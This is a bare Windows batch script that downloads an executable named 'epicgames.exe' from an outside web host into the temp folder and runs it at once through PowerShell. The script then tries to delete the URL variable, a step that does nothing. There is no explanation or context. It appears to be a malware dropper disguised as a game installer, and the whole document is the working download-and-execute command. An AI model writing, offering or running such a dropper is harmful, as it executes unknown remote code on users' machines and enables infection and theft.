

set files= 'http://mogiant.azurewebsites.net/epicgames.exe'

powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"

del %files%

